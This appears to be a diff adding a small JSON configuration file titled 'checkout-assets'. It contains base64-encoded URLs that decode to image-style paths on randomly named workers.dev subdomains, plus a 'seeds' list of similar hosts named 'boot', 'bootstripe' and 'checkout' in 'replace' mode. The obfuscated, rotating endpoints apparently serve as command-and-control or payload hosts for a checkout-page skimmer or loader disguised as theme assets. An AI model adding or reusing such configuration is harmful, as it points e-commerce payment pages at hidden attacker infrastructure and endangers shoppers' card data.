@@ -1,0 +1,21 @@
+{
+  "v": 2,
+  "theme": "checkout-assets",
+  "ts": 1740000000,
+  "hop1": [
+    "aHR0cHM6Ly93b3JrLmFubmF2eWV3dWp3NTMud29ya2Vycy5kZXYvaW1hZ2UuOGYzZDJhMWMucG5nP3dpZHRoPTEwMCZxdWFsaXR5PTc1",
+    "aHR0cHM6Ly9jZG4ucGx1bWUtZmlybWVyLTk0LndvcmtlcnMuZGV2L2ltYWdlLjhmM2QyYTFjLnBuZz93aWR0aD0xMDAmcXVhbGl0eT03NQ==",
+    "aHR0cHM6Ly9jZG4ucGx1bWUtZmlybWVyLTk0LndvcmtlcnMuZGV2L2ltYWdlLjhmM2QyYTFjLnBuZz93aWR0aD0xMDAmcXVhbGl0eT03OA==",
+    "aHR0cHM6Ly93b3JrLnJldnVlcy1zdHJvcHMtM2cud29ya2Vycy5kZXYvaW1hZ2UuOGYzZDJhMWMucG5nP3dpZHRoPTEwMCZxdWFsaXR5PTc4",
+    "aHR0cHM6Ly93b3JrLnJldnVlcy1zdHJvcHMtM2cud29ya2Vycy5kZXYvaW1hZ2UuOGYzZDJhMWMucG5nP3dpZHRoPTEwMCZxdWFsaXR5PTcw"
+  ],
+  "seeds": [
+    "https://assets.32-ultras-blower.workers.dev/",
+    "https://bootstripe.32-ultras-blower.workers.dev/",
+    "https://boot.32-ultras-blower.workers.dev/",
+    "https://bootra.32-ultras-blower.workers.dev/",
+    "https://checkout.32-ultras-blower.workers.dev/"
+  ],
+  "seeds_mode": "replace",
+  "backend": null
+}
